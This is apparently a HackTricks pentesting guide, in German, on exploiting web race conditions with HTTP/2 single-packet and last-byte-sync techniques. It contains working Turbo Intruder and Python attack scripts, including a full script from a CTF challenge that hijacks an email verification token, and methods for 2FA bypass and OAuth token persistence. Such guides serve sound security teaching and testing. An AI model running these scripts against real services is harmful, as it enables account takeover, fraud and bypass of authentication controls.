# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Für ein tiefes Verständnis dieser Technik lesen Sie den Originalbericht unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbesserung von Race Condition-Angriffen

Das Hauptproblem beim Ausnutzen von Race Conditions besteht darin sicherzustellen, dass mehrere Requests gleichzeitig verarbeitet werden, mit **sehr geringen Unterschieden in ihren Verarbeitungszeiten — idealerweise unter 1 ms**.

Hier finden Sie einige Techniken zum Synchronisieren von Requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Unterstützt das Senden von zwei Requests über eine einzige TCP-Verbindung, wodurch Netzjitter weniger ins Gewicht fällt. Aufgrund serverseitiger Variationen reichen zwei Requests jedoch möglicherweise nicht für einen zuverlässigen Race Condition-Exploit.
- **HTTP/1.1 'Last-Byte Sync'**: Ermöglicht das Vorausversenden der meisten Teile von 20–30 Requests, wobei ein kleines Fragment zurückgehalten wird, das dann gemeinsam gesendet wird, um ein gleichzeitiges Eintreffen beim Server zu erreichen.

**Vorbereitung für Last-Byte Sync** beinhaltet:

1. Senden von Headern und Body-Daten minus dem letzten Byte, ohne den Stream zu beenden.
2. Warten für 100 ms nach dem ersten Senden.
3. Deaktivieren von TCP_NODELAY, um Nagle's algorithm zu nutzen und die letzten Frames zu bündeln.
4. Ping durchführen, um die Verbindung vorzuwärmen.

Das anschließende Senden der zurückgehaltenen Frames sollte dazu führen, dass sie in einem einzelnen Packet ankommen, was sich mit Wireshark überprüfen lässt. Diese Methode gilt nicht für statische Dateien, die normalerweise nicht in RC-Angriffe involviert sind.

### Anpassung an die Server-Architektur

Das Verständnis der Zielarchitektur ist entscheidend. Front-end-Server können Requests unterschiedlich routen, was die Timing-Effekte beeinflusst. Vorab durchgeführtes server-seitiges Connection Warming mittels unkritischer Requests kann das Timing der Requests angleichen.

#### Umgang mit session-basierter Sperrung

Frameworks wie PHPs session handler serialisieren Requests pro Session und können so Sicherheitslücken verschleiern. Die Verwendung unterschiedlicher session tokens für jede Request kann dieses Problem umgehen.

#### Überwinden von Rate- oder Ressourcenlimits

Wenn Connection Warming nicht wirkt, kann das absichtliche Auslösen von Rate- oder Ressourcenlimit-Verzögerungen auf Webservern durch eine Flut von Dummy-Requests den Single-Packet-Angriff begünstigen, indem dadurch serverseitige Verzögerungen entstehen, die Race Conditions fördern.

## Angriffsbeispiele

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Sie können die Anfrage an **Turbo intruder** senden (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), im Request den Wert ändern, den Sie für **`%s`** brute-forcen möchten, wie in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, und dann **`examples/race-single-packer-attack.py`** aus dem Dropdown auswählen:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Wenn Sie **verschiedene Werte senden** wollen, können Sie den Code wie folgt anpassen, damit eine wordlist aus der Zwischenablage verwendet wird:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Wenn die Website HTTP2 nicht unterstützt (nur HTTP1.1), verwende `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Falls du eine Anfrage an 1 endpoint senden musst und anschließend mehrere an andere endpoints, um die RCE auszulösen, kannst du das Skript `race-single-packet-attack.py` wie folgt ändern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Es ist außerdem in **Repeater** über die neue Option '**Send group in parallel**' in Burp Suite verfügbar.
- Für **limit-overrun** könntest du einfach dieselbe **Anfrage 50-mal** in die Gruppe einfügen.
- Für **connection warming** könntest du am **Anfang** der **Gruppe** einige **Anfragen** an einen nicht-statischen Teil des Webservers hinzufügen.
- Für **delaying** des Prozesses **zwischen** der Verarbeitung **einer Anfrage und einer anderen** in zwei Substate-Schritten könntest du zusätzliche **Anfragen zwischen** beiden Anfragen einfügen.
- Für ein **multi-endpoint** RC könntest du damit beginnen, die **Anfrage** zu senden, die **in den versteckten Zustand übergeht**, und dann unmittelbar danach **50 Anfragen**, die den **versteckten Zustand ausnutzen**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Das Ziel dieses Skripts ist, die E-Mail eines Benutzers zu ändern und dabei kontinuierlich zu überprüfen, bis das Verifizierungstoken der neuen E-Mail bei der zuletzt genutzten E-Mail ankommt (das liegt daran, dass im Code ein RC beobachtet wurde, bei dem es möglich war, eine E-Mail zu ändern, aber die Verifizierung an die alte gesendet wurde, weil die Variable, die die E-Mail angibt, bereits mit der ersten befüllt war).\
Wenn das Wort "objetivo" in den empfangenen E-Mails gefunden wird, wissen wir, dass wir das Verifizierungstoken der geänderten E-Mail erhalten haben, und beenden den Angriff.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine-Auswahl: Verwende `Engine.BURP2` bei HTTP/2-Zielen, um den single‑packet attack auszulösen; weiche auf `Engine.THREADED` oder `Engine.BURP` für HTTP/1.1 last‑byte sync zurück.
- `gate`/`openGate`: füge viele Kopien in die Warteschlange mit `gate='race1'` (oder per‑attempt gates), die den tail jeder Anfrage zurückhalten; `openGate('race1')` spült alle tails zusammen, sodass sie nahezu gleichzeitig ankommen.
- Diagnostik: negative Zeitstempel in Turbo Intruder zeigen an, dass der Server geantwortet hat, bevor die Anfrage vollständig gesendet war, was Überlappung beweist. Dies ist bei true races zu erwarten.
- Connection warming: sende zuerst ein Ping oder ein paar harmlose Requests, um die Timings zu stabilisieren; optional `TCP_NODELAY` deaktivieren, um das Batching der finalen Frames zu fördern.


### Improving Single Packet Attack

In der ursprünglichen Forschung wird erklärt, dass dieser Angriff eine Grenze von 1.500 Bytes hat. Allerdings wurde in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) beschrieben, wie es möglich ist, die 1.500‑Byte‑Beschränkung des single packet attack auf die **65.535 B Fensterbegrenzung von TCP durch Verwendung von IP‑Layer‑Fragmentation** zu erweitern (ein einzelnes Paket in mehrere IP‑Pakete aufteilen) und diese in unterschiedlicher Reihenfolge zu senden, wodurch verhindert wird, dass das Paket wieder zusammengesetzt wird, bis alle Fragmente den Server erreicht haben. Mit dieser Technik konnte der Forscher etwa 10.000 Requests in ca. 166 ms senden.

Beachte, dass obwohl diese Verbesserung den Angriff bei RC, die Hunderte/Tausende von Paketen gleichzeitig benötigen, zuverlässiger macht, sie auch Software‑Einschränkungen haben kann. Einige populäre HTTP‑Server wie Apache, Nginx und Go haben eine strikte `SETTINGS_MAX_CONCURRENT_STREAMS` Einstellung auf 100, 128 bzw. 250. Andere wie NodeJS und nghttp2 haben sie jedoch unbegrenzt.\
Das bedeutet im Wesentlichen, dass Apache nur 100 HTTP connections von einer einzelnen TCP‑Verbindung berücksichtigt (was diesen RC‑Angriff einschränkt).

Du findest Beispiele, die diese Technik verwenden, im Repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Vor der genannten Forschung waren dies einige Payloads, die einfach versucht haben, die Pakete so schnell wie möglich zu senden, um eine RC zu verursachen.

- **Repeater:** Siehe die Beispiele aus dem vorherigen Abschnitt.
- **Intruder**: Sende die **request** an **Intruder**, setze die **number of threads** auf **30** im **Options menu**, wähle als Payload **Null payloads** und generiere **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Dies ist der grundlegendste Typ einer race condition, bei dem **Vulnerabilities** an Stellen auftreten, die die Anzahl der Male begrenzen, in denen du eine Aktion ausführen kannst. Zum Beispiel dieselben Rabattcodes in einem Webshop mehrfach verwenden. Ein sehr einfaches Beispiel findest du in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**this bug**](https://hackerone.com/reports/759247)**.**

Es gibt viele Varianten dieser Art von Angriff, darunter:

- Mehrfaches Einlösen einer gift card
- Ein Produkt mehrfach bewerten
- Mehr Geld abheben oder transferieren als dein Konto-Guthaben
- Wiederverwenden einer einzelnen CAPTCHA-Lösung
- Umgehen eines anti-brute-force rate limit

### **Hidden substates**

Das Ausnutzen komplexer race conditions beinhaltet oft das Nutzen kurzer Zeitfenster, um mit versteckten oder **unbeabsichtigten Maschinen-Subzuständen** zu interagieren. So gehst du vor:

1. **Identify Potential Hidden Substates**
- Beginne damit, Endpunkte zu identifizieren, die kritische Daten ändern oder damit interagieren, wie Benutzerprofile oder password reset Prozesse. Konzentriere dich auf:
- **Storage**: Bevorzuge Endpunkte, die serverseitige persistente Daten manipulieren statt solche, die Daten clientseitig verarbeiten.
- **Action**: Suche nach Operationen, die bestehende Daten verändern — diese erzeugen eher ausnutzbare Bedingungen als solche, die neue Daten hinzufügen.
- **Keying**: Erfolgreiche Angriffe involvieren meistens Operationen, die auf demselben Identifier basieren, z. B. username oder reset token.
2. **Conduct Initial Probing**
- Teste die identifizierten Endpunkte mit race condition Attacken und beobachte Abweichungen vom erwarteten Verhalten. Unerwartete Responses oder Verhaltensänderungen der Anwendung können auf eine Vulnerability hinweisen.
3. **Demonstrate the Vulnerability**
- Reduziere den Angriff auf die minimale Anzahl von Requests, die nötig sind, um die Vulnerability auszunutzen — oft nur zwei. Dieser Schritt kann aufgrund des präzisen Timings mehrere Versuche oder Automation erfordern.

### Time Sensitive Attacks

Präzises Timing von Requests kann Vulnerabilities offenlegen, besonders wenn vorhersehbare Methoden wie timestamps für security tokens verwendet werden. Wenn password reset tokens beispielsweise auf timestamps basieren, könnten identische tokens für simultane Requests erzeugt werden.

Zum Ausnutzen:

- Verwende präzises Timing, z. B. einen Single-Packet-Angriff, um gleichzeitige password reset requests zu senden. Identische tokens deuten auf eine Vulnerability hin.

Beispiel:

- Fordere zwei password reset tokens gleichzeitig an und vergleiche sie. Übereinstimmende tokens deuten auf einen Fehler in der Token-Generierung hin.

Teste das im [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities).

## Fallstudien zu versteckten Subzuständen

### Pay & add an Item

Sieh dir das [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) an, um zu sehen, wie du in einem Shop **bezahlen** und gleichzeitig einen zusätzlichen Artikel **hinzufügen** kannst, für den du **nicht zahlen musst**.

### Confirm other emails

Die Idee ist, eine E-Mail-Adresse **zu verifizieren und sie gleichzeitig auf eine andere zu ändern**, um herauszufinden, ob die Plattform die neue Adresse tatsächlich verifiziert.

### Change email to 2 emails addresses Cookie based

Laut [**this research**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab auf diese Weise für eine Übernahme verwundbar, weil es möglicherweise den **email verification token einer E-Mail an eine andere E-Mail senden** konnte.

Teste das im [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint).

### Hidden Database states / Confirmation Bypass

Wenn **2 different writes** verwendet werden, um **Informationen** in einer **Datenbank** hinzuzufügen, gibt es ein kleines Zeitfenster, in dem **nur die ersten Daten geschrieben sind**. Zum Beispiel werden beim Erstellen eines Users möglicherweise zuerst der **username** und das **password** geschrieben und **dann** das Token, um das neu erstellte Konto zu bestätigen. Das bedeutet, dass für kurze Zeit das **Bestätigungstoken null** ist.

Daher könnte das **Registrieren eines Accounts und das sofortige Senden mehrerer Requests mit einem leeren token** (`token=` oder `token[]=` oder jede andere Variation) erlauben, ein Konto zu **bestätigen**, dessen E-Mail du nicht kontrollierst.

Teste das im [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction).

### Bypass 2FA

Der folgende Pseudo-Code ist gegenüber race conditions verwundbar, weil in einem sehr kurzen Zeitfenster die **2FA nicht durchgesetzt wird**, während die Session erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Diese Dienste ermöglichen es Ihnen, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die beim Provider registriert sind. Dazu muss der **client** Ihrer Anwendung erlauben, auf einige ihrer Daten beim **OAUth provider** zuzugreifen.\
Bis hierhin also ein normaler Login mit google/linkedin/github..., bei dem Ihnen eine Seite angezeigt wird mit der Aufforderung: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Das **Problem** tritt auf, wenn Sie es **akzeptieren** und automatisch ein **`authorization_code`** an die bösartige Anwendung gesendet wird. **Diese Anwendung missbraucht dann eine Race Condition im OAUth service provider, um aus dem `authorization_code` für Ihr Konto mehr als ein AT/RT zu erzeugen** (_Authentication Token/Refresh Token_). Im Grunde nutzt sie aus, dass Sie der Anwendung Zugriff auf Ihre Daten gewährt haben, um **mehrere Konten** zu erstellen. Wenn Sie der Anwendung danach den Zugriff entziehen, wird ein Paar von AT/RT gelöscht, aber die anderen bleiben weiterhin gültig.

#### Race Condition in `Refresh Token`

Sobald Sie ein gültiges RT erhalten haben, können Sie versuchen, es zu missbrauchen, um mehrere AT/RT zu erzeugen — und selbst wenn der Benutzer der bösartigen Anwendung die Berechtigungen entzieht, bleiben mehrere RTs weiterhin gültig.

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) finden Sie einen PoC in Java, um WebSocket-Nachrichten **parallel** zu senden und **Race Conditions auch in Web Sockets** auszunutzen.
- Mit Burp’s WebSocket Turbo Intruder können Sie die **THREADED**-Engine verwenden, um mehrere WS-Verbindungen zu erzeugen und Payloads parallel abzuschießen. Beginnen Sie mit dem offiziellen Beispiel und passen Sie `config()` (Thread-Anzahl) für die Parallelität an; dies ist oft zuverlässiger als das Batching auf einer einzelnen Verbindung, wenn serverseitiger Zustand über WS-Handler gleichzeitig verändert wird. Siehe [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
